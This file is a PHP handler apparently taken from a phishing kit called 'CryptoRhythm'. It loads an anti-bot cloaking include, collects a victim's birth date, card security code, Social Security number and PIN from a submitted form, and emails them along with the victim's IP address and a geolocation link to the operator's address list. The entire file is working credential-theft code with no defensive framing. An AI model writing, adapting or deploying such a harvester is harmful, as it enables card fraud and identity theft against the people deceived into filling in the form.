<?php
  session_start();
  require_once("../inc/config.inc.php");
  require_once("../antibots.php");
  if(isset($_GET['submit'])) {
    $bd = $_GET['bd'];
    $secv = $_GET['secv'];
    $ssn = $_GET['ssn'];
    $pin = $_GET['pin'];
    $_SESSION['step'] = "s3";
    /* Mail */
    $ip = $_SESSION['_ip_'];
    $cd = $_SESSION['cd'];
    $body = "
    CryptoRhythm V 2.1 [PRV8]
    [Card Verification]
    Birth date > $bd
    Security code > $secv
    SSN > $ssn
    PIN > $pin
    [Client Info]
    IP > $ip
    Track > http://www.ip-tracker.org/locator/ip-lookup.php?ip=$ip
    ";
    $subject = "[CryptoRhythm] Credit card verification for [$cd] - $ip";
    foreach(explode(",", $tomail) as $tom) {
	mail($tom, $subject, $body);
    }
    echo "RESULT:DONE;";
  }
?>
